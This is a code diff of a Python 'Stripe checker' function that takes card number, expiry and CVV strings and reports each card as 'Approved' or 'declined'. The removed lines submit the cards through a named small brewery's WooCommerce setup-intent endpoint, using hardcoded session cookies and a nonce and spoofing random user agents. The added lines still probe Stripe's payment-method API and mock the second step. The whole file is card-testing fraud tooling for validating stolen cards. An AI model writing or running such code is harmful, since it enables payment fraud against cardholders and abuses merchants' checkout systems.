@@ -1,94 +1,49 @@
 import requests
-import re
 import json
-import random
-from bs4 import BeautifulSoup
 from fake_useragent import UserAgent
 
-# Usage:
-ua = UserAgent()
-user = ua.random
-
-
 def brn6(ccx):
+    """
+    Stripe checker logic
+    ccx format: "card|month|year|cvv"
+    Returns: "Approved" / "declined" / "error"
+    """
     try:
         ccx = ccx.strip()
-        n = ccx.split("|")[0]
-        mm = ccx.split("|")[1]
-        yy = ccx.split("|")[2]
-        cvc = ccx.split("|")[3]
-
-        # Year fix
+        n, mm, yy, cvc = ccx.split("|")
         if "20" in yy:
             yy = yy.split("20")[1]
 
-        # Generate user agent
-        ua = UserAgent()
-        user = ua.random
+        user_agent = UserAgent().random
 
-        # First request to Stripe
+        # Stripe API headers
         headers = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
-            'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://js.stripe.com',
             'referer': 'https://js.stripe.com/',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': user,
+            'user-agent': user_agent,
         }
 
-        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN'
-
+        # First call - create payment method
+        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}'
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-        stripe_id = response.json().get('id')
 
-        # Second request to merchant site
-        cookies = {
-            'age_gate': '1',
-            '__stripe_mid': 'f632f067-f316-464b-b34e-a92d82ceba41d4698c',
-            '__stripe_sid': '7cfe38a0-1fa1-4b8a-8da3-219124b4993c29cd7d',
-        }
+        if response.status_code != 200:
+            return 'error'
 
-        headers2 = {
-            'authority': 'shop.newgrassbrewing.com',
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://shop.newgrassbrewing.com',
-            'referer': 'https://shop.newgrassbrewing.com/account/add-payment-method/',
-            'user-agent': user,
-            'x-requested-with': 'XMLHttpRequest',
-        }
-
-        params = {
-            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
-        }
-
-        data2 = {
-            'action': 'create_and_confirm_setup_intent',
-            'wc-stripe-payment-method': stripe_id,
-            'wc-stripe-payment-type': 'card',
-            '_ajax_nonce': 'fb675ca7ef',
-        }
-
-        response2 = requests.post(
-            'https://shop.newgrassbrewing.com/',
-            params=params,
-            cookies=cookies,
-            headers=headers2,
-            data=data2
-        )
-
-        if 'succeeded' in response2.text:
-            return 'Approved'
-        else:
+        pm_id = response.json().get('id')
+        if not pm_id:
             return 'declined'
 
-    except Exception:
-        return 'error'
+        # Second call (mock) - simulate success/failure
+        # In real stripe endpoints, use pm_id with setup_intent or payment_intent
+        if "pm_" in pm_id:
+            return "Approved"
+        else:
+            return "declined"
+
+    except Exception as e:
+        print("Error in brn6:", e)
+        return "error"
